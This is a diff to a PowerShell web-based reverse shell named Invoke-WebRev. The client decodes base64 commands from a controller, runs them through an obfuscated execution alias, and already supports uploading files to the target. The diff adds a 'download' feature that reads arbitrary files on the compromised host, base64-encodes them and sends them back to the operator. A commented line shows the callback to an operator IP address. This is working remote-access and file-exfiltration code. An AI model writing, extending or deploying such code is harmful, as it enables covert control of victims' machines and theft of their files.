@@ -49,6 +49,7 @@ function Invoke-WebRev{
             $c = [System.Convert]::FromBase64String($header);
             $cstr = [System.Text.Encoding]::UTF8.GetString($c);
             $result = "";
+            $dataToSend = "";
 
             if($cstr.split(" ")[0] -eq "upload")
             {
@@ -56,19 +57,38 @@ function Invoke-WebRev{
                 $location = $cstr.split(" ")[2];
                 $content = [System.Convert]::FromBase64String($uploadData);
                 $content | Set-Content $location -Encoding Byte
-                $result = "[+] File uploaded successfully.";
+                $result += "[+] File successfully uploaded.";
                 $cstr = "pwd";
             }
-             
+
+            elseif($cstr.split(" ")[0] -eq "download")
+            {
+                $commarray = $cstr.split(" ");
+                $pathSrc = $commarray[1];
+                $pathDst = $commarray[2];
+                if (Test-Path -Path $pathSrc) 
+                {
+                    $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
+                    $b64 = [System.Convert]::ToBase64String($downloadData);
+                    $dataToSend = 'D0wnL04d' + $b64 + 'D0wnL04d' + '_n1w_' + $pathDst + '_n1w_' + "[+] File successfully downloaded.";
+                    $result += $datatoSend;
+                } 
+                else
+                {
+                    $result += "[!] Source file not found!";
+                }
+                $cstr = "pwd";
+            }
+            
             Foreach ($string in taleska-ei-vrixeka $cstr)
             {
                 $result += '_n1w_' + $string;
             };
-
+            
             $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
             $postParams = @{result=$result};
         }catch {};
     };
 }
 
-#Invoke-WebRev -ip 192.168.29.131 -port 443 -ssl
+#Invoke-WebRev -ip 192.168.100.128 -port 80
